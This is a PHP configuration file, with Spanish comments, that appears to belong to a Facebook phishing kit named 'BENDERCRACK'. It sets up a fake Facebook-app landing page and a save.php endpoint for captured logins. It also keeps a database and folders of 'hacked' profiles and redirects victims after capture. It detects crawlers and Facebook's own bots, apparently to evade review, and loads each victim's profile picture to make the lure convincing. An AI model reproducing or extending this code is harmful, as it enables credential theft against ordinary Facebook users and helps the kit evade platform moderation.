<?php
// START SESSION
if(!session_id()) session_start();

////////////////////////////////////////////////////////////////////////////////////// Client Part

define("IS_DIRECT", 0);

define("LINK_PC", ""); // Link Para redireccionar a PC despues de hack
define("LINK_MOBILE", ""); // Link Para redireccionar a Mobiles despues de hack
define("LINK_BACK", "#"); // Link Para redireccionar cuando vuelvan atras

define("DATABASE", ""); //////// Nombre d ebase de datos hackiados por SQL
define("HACK_TEXT_FOLDER", ""); //////// Nombre de carpeta de hackiado por texto
define("COUNTER_GENERAL", ""); //////// Contador General

////////////////////////////////////////////////////////////////////////////////////////

/************
 *
 * CONFIGURACIÓN BENDERCRACK
 *
************/
//NOMBRE DEL TRABAJADOR (SIN ESPACIOS) **IMPORTANTE**
//define("USERNAME", ""); // para identificar sus perfiles en la base de datos

//BASE DE DATOS *USANDO PDO ANTI HACKEO*
$servidor = "mysql:dbname=;host=127.0.0.1";
$usuario = "";
$pass = '';
try{
   $pdo = new PDO($servidor,$usuario,$pass, array(PDO::MYSQL_ATTR_INIT_COMMAND=>"SET NAMES utf8"));
}catch(PDOException $e){
    //echo "No se púede conectar".$e->getMessage();
}

//CONTRASEÑA DEL PANEL
define("PASSPERFILES", ""); //

// REQUIRE composers autoload
require(dirname(__FILE__).'/vendor/autoload.php');

// REQUIRE FUNCTIONS
require(dirname(__FILE__).'/includes/functions.php');

// Require Detect Crawlers
require(dirname(__FILE__).'/includes/CrawlerDetect.php');

use Jaybizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

$hacktype = "1"; if(isset($_REQUEST['ht']))  $hacktype = $_REQUEST['ht'];
$uid = false; if(isset($_REQUEST['uid']))  $uid = $_REQUEST['uid'];
if(!$uid && isset(build_params()['uid'])){ $uid = build_params()['uid']; };

$name_ = false; if(isset($_REQUEST['called']))  $name_ = $_REQUEST['called'];
if(!$name_ && isset(build_params()['called'])){ $name_ = build_params()['called']; };

$landing = 'facebookapphk'; if(isset($_GET['lan'])) $landing = $_GET['lan'];

define("HACKTYPE",  $hacktype); ///////////////// TIPO DE HACK

define("HACKTEXTFOLDER",CDINE(dirname(__FILE__).'/'.HACK_TEXT_FOLDER));
define("ACCESSFACEBOOK", dirname(__FILE__).'/save.php');
define("HOST_URL", (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]".dirname($_SERVER['PHP_SELF']));
define("ACCESSFACEBOOK_URL", str_replace('public/', '', HOST_URL.'/save.php?'.http_build_query($_GET)));
define("PICTURE_BY_COMMENT",'<iframe src="'.HOST_URL.'/includes/fb-picture.php"  width="48" height="48" scrolling="no" frameborder="0"></iframe>');
define("DB_FOLDER",CDINE(dirname(__FILE__).'/'));
define("IS_MOBILE", isMobile());
define("LANDING_SELECT",$landing);
define("INCLUDES_FOLDER", dirname(__FILE__).'/includes');
define("CLIENT_IP",  getIP());
define("IS_BOT",$CrawlerDetect->isCrawler());
define("FB_BOT",detectBotViaIPFB(getIP()));

//////////////// USER FACEBOOK

define("USER_UID", $uid);
define("CALLED", $name_);

define("USER_PHOTO", "https://graph.facebook.com/".USER_UID."/picture?with=300&height=300");

define("LINK_SELECT", (IS_MOBILE?LINK_MOBILE:LINK_PC) );



$UNIQUEACCESS_STRING = "xps=".time();
$ZNZENCODE = new ZNZENCODE();
define("UNIQUE_ACCESS", urlencode(($ZNZENCODE->encode($UNIQUEACCESS_STRING))) );
